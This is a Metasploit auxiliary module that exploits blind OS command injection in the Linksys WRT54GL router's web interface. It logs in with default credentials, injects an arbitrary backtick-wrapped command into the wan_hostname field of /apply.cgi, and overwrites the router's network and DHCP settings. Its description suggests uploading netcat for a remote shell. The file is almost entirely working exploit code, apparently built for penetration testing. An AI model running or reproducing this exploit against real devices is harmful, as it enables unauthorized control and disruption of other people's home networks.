##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Linksys WRT54GL Remote Command Execution',
			'Description'     => %q{
					Some Linksys Routers are vulnerable to OS Command injection.
				You will need credentials to the web interface to access the vulnerable part
				of the application. 
				Default credentials are always a good starting point. admin/admin or admin 
				and blank password could be a first try.
				Note: This is a blind os command injection vulnerability. This means that 
				you will not see any output of your command. Try a ping command to your 
				local system for a first test.
				
				Hint: To get a remote shell you could upload a netcat binary and exec it. 
				WARNING: Backup your network and dhcp configuration. We will overwrite it!
				Have phun
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://homesupport.cisco.com/en-eu/support/routers/WRT54GL' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-01' ],
					[ 'URL', 'http://www.s3cur1ty.de/attacking-linksys-wrt54gl' ],
					[ 'EDB', '24202' ],
					[ 'BID', '57459' ],
					[ 'OSVDB', '89421' ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 18 2013'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('TARGETURI',[ true, 'PATH to OS Command Injection', '/apply.cgi']),
				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
				OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1']),
				OptString.new('NETMASK', [ false, 'LAN Netmask of the router', '255.255.255.0']),
				OptAddress.new('LANIP', [ false, 'LAN IP address of the router - CHANGE THIS', '1.1.1.1']),
				OptString.new('ROUTER_NAME', [ false, 'Name of the router', 'cisco']),
				OptString.new('WAN_DOMAIN', [ false, 'WAN Domain Name', 'test']),
				OptString.new('WAN_MTU', [ false, 'WAN MTU', '1500']),
			], self.class)
	end

	def run
		#setting up some basic variables
		uri = datastore['TARGETURI']
		user = datastore['USERNAME']
		rhost = datastore['RHOST']
		netmask = datastore['NETMASK']
		routername = datastore['ROUTER_NAME']
		wandomain = datastore['WAN_DOMAIN']
		wanmtu = datastore['WAN_MTU']
		
		if datastore['LANIP'] !~ /1.1.1.1/
			#there is a configuration from the user so we use LANIP for the router configuration
			ip = datastore['LANIP'].split('.')
		else
			#no configuration from user so we use RHOST for the router configuration
			ip = rhost.split('.')
		end
		
		# not sure if this is a good way for blank passwords:
		if datastore['PASSWORD'] == "<BLANK>"
			pass = ""
		else
			pass = datastore['PASSWORD']
		end

		print_status("Trying to login with #{user} / #{pass}")

				begin
						res = send_request_cgi({
								'uri'	 => uri,
								'method'  => 'GET',
								'basic_auth' => "#{user}:#{pass}"
								})

						unless (res.kind_of? Rex::Proto::Http::Response)
								vprint_error("#{rhost} not responding")
						end

						return :abort if (res.code == 404)

						if [200, 301, 302].include?(res.code)
							print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")	
						else
								print_error("NO SUCCESSFUL LOGIN POSSIBLE. '#{user}' : '#{pass}'")
								return :abort
						end

				rescue ::Rex::ConnectionError
						vprint_error("#{rhost} - Failed to connect to the web server")
						return :abort
				end

		print_status("Sending remote command: " + datastore['CMD'])

	#	cmd = Rex::Text.uri_encode(datastore['CMD'])
		cmd = datastore['CMD']

		#original Post Request:
#		data_cmd = "submit_button=index&change_action=&submit_type=&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=#{routername}&wan_hostname=`#{cmd}`&wan_domain=#{wandomain}&mtu_enable=1&wan_mtu=#{wanmtu}&lan_ipaddr_0=#{ip[0]}&lan_ipaddr_1=#{ip[1]}&lan_ipaddr_2=#{ip[2]}&lan_ipaddr_3=#{ip[3]}&lan_netmask=#{netmask}&lan_proto=dhcp&dhcp_check=&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1"

		if datastore['VERBOSE'] == true
			print_line("using the following target URL: \n#{uri}")
		end

		begin
			res = send_request_cgi(
				{
					'uri'	=> uri,
					'method' => 'POST',
					'basic_auth' => "#{pass}:#{pass}",
					#'data' => data_cmd,

					'vars_post' =>
                                    		{
                                                'submit_button' => "index",
						'change_action' => "1",
						'submit_type' => "1",
						'action' => "Apply",
						'now_proto' => "dhcp",
						'daylight_time' => "1",
						'lan_ipaddr' => "4",
						'wait_time' => "0",
						'need_reboot' => "0",
						'ui_language' => "de",
						'wan_proto' => "dhcp",
						'router_name' => "#{routername}",
						'wan_hostname' => "`#{cmd}`",
						'wan_domain' => "#{wandomain}",
						'mtu_enable' => "1",
						'wan_mtu' => "#{wanmtu}",
						'lan_ipaddr_0' => "#{ip[0]}",
						'lan_ipaddr_1' => "#{ip[1]}",
						'lan_ipaddr_2' => "#{ip[2]}",
						'lan_ipaddr_3' => "#{ip[3]}",
						'lan_netmask' => "#{netmask}",
						'lan_proto' => "dhcp",
						'dhcp_check' => "1",
						'dhcp_start' => "100",
						'dhcp_num' => "50",
						'dhcp_lease' => "0",
						'wan_dns' => "4",
						'wan_dns0_0' => "0",
						'wan_dns0_1' => "0",
						'wan_dns0_2' => "0",
						'wan_dns0_3' => "0",
						'wan_dns1_0' => "0",
						'wan_dns1_1' => "0",
						'wan_dns1_2' => "0",
						'wan_dns1_3' => "0",
						'wan_dns2_0' => "0",
						'wan_dns2_1' => "0",
						'wan_dns2_2' => "0",
						'wan_dns2_3' => "0",
						'wan_wins' => "4",
						'wan_wins_0' => "0",
						'wan_wins_1' => "0",
						'wan_wins_2' => "0",
						'wan_wins_3' => "0",
						'time_zone' => "-08+1+1",
						'_daylight_time' => '1'
						},
				})
				rescue ::Rex::ConnectionError
						vprint_error("#{rhost} - Failed to connect to the web server")
						return :abort
				end
		print_line("")
		print_status("Blind Exploitation - wait around 10 seconds until the configuration gets applied and your command gets executed")
		print_status("Blind Exploitation - unknown Exploitation state\n")
	end
end

